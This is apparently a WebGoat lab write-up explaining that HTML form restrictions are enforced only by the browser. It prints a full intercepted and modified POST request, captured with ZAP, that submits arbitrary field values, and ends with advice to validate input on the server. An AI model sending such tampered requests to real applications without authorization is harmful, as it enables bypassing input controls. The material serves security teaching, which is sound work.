 	
## Vulnerability:

As previously, client-side validation (this time in form of HTML restrictions) is only respected by the browser so it's not security measure. One can trivially send request which sets arbitrary values for inputs in the form as shown below.

## Exploitation:

I used ZAP to intercept Firefox request, I've modified request (see my request below) & resent it.

```
POST http://webgoat.hacking-lab.com/attack?Screen=51&menu=1700 HTTP/1.1
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:30.0) Gecko/20100101 Firefox/30.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
DNT: 1
Referer: http://webgoat.hacking-lab.com/attack?Screen=51&menu=1700
Cookie: JSESSIONID=BE78568F44EF325354FDF39A12E0E7AC
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 108
Host: webgoat.hacking-lab.com

select=sdf&radio=sdfdsf&checkbox=sdfn&shortinput=sdfsdfsdf&disabledinput=sdfffff&SUBMIT=sdfsdfsdddfsdfsdfsdf
```

Mitigation:

HTML restrictions are only enforced on client-side (by browser). Server-side validation is needed to make sure that only allowed input was provided. 
